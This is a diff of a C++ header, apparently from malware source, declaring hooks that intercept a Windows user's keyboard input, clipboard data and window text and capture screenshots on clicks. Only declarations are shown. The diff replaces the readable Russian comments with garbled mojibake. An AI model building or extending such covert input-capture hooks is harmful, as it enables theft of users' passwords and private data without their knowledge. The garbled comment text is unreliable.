@@ -1,55 +1,55 @@
 /*
-  Перехват ввода пользователя.
+  РџРµСЂРµС…РІР°С‚ РІРІРѕРґР° РїРѕР»СЊР·РѕРІР°С‚РµР»СЏ.
 */
 #pragma once
 
 namespace UserHook
 {
   /*
-    Инициализация.
+    РРЅРёС†РёР°Р»РёР·Р°С†РёСЏ.
   */
   void init(void);
 
   /*
-    Деинициализация.
+    Р”РµРёРЅРёС†РёР°Р»РёР·Р°С†РёСЏ.
   */
   void uninit(void);
 
   /*
-    Включение захвата изображения при клики.
+    Р’РєР»СЋС‡РµРЅРёРµ Р·Р°С…РІР°С‚Р° РёР·РѕР±СЂР°Р¶РµРЅРёСЏ РїСЂРё РєР»РёРєРё.
 
-    IN clickCount - кол. кликов для захвата.
-    IN filePrefix - префикс имен файлов изоброжений. Может быть NULL.
+    IN clickCount - РєРѕР». РєР»РёРєРѕРІ РґР»СЏ Р·Р°С…РІР°С‚Р°.
+    IN filePrefix - РїСЂРµС„РёРєСЃ РёРјРµРЅ С„Р°Р№Р»РѕРІ РёР·РѕР±СЂРѕР¶РµРЅРёР№. РњРѕР¶РµС‚ Р±С‹С‚СЊ NULL.
   */
   void enableImageOnClick(WORD clicksCount, LPSTR filePrefix);
   
   /*
-    Очистка буфера ввода пользователя.
+    РћС‡РёСЃС‚РєР° Р±СѓС„РµСЂР° РІРІРѕРґР° РїРѕР»СЊР·РѕРІР°С‚РµР»СЏ.
   */
   void clearInput(void);
 
   /*
-    Получение текущей истории ввода.
+    РџРѕР»СѓС‡РµРЅРёРµ С‚РµРєСѓС‰РµР№ РёСЃС‚РѕСЂРёРё РІРІРѕРґР°.
 
-    OUT buffer - буфер, необходимо освободить через Mem.
+    OUT buffer - Р±СѓС„РµСЂ, РЅРµРѕР±С…РѕРґРёРјРѕ РѕСЃРІРѕР±РѕРґРёС‚СЊ С‡РµСЂРµР· Mem.
 
-    Return     - 0 - если буфер пусть, *buffer будет равен NULL.
-                 >0 - размер buffer в символах, исключая нулевой символ.
+    Return     - 0 - РµСЃР»Рё Р±СѓС„РµСЂ РїСѓСЃС‚СЊ, *buffer Р±СѓРґРµС‚ СЂР°РІРµРЅ NULL.
+                 >0 - СЂР°Р·РјРµСЂ buffer РІ СЃРёРјРІРѕР»Р°С…, РёСЃРєР»СЋС‡Р°СЏ РЅСѓР»РµРІРѕР№ СЃРёРјРІРѕР».
   */
   DWORD getInput(LPWSTR *buffer);
   
   /*
-    Перехватчик TranslateMessage.
+    РџРµСЂРµС…РІР°С‚С‡РёРє TranslateMessage.
   */
   BOOL WINAPI hookerTranslateMessage(const MSG *msg);
 
   /*
-    Перехватчик GetClipboardData.
+    РџРµСЂРµС…РІР°С‚С‡РёРє GetClipboardData.
   */
   HANDLE WINAPI hookerGetClipboardData(UINT format);
 
-  /*В В В В Interceptor SetWindowTextW.
-В В */
+  /*Р’В Р’В Р’В Р’В Interceptor SetWindowTextW.
+Р’В Р’В */
 #if defined HOOKER_SETWINDOWTEXT
   BOOL WINAPI hookerSetWindowTextW(HWND window, const LPWSTR string);
 #endif
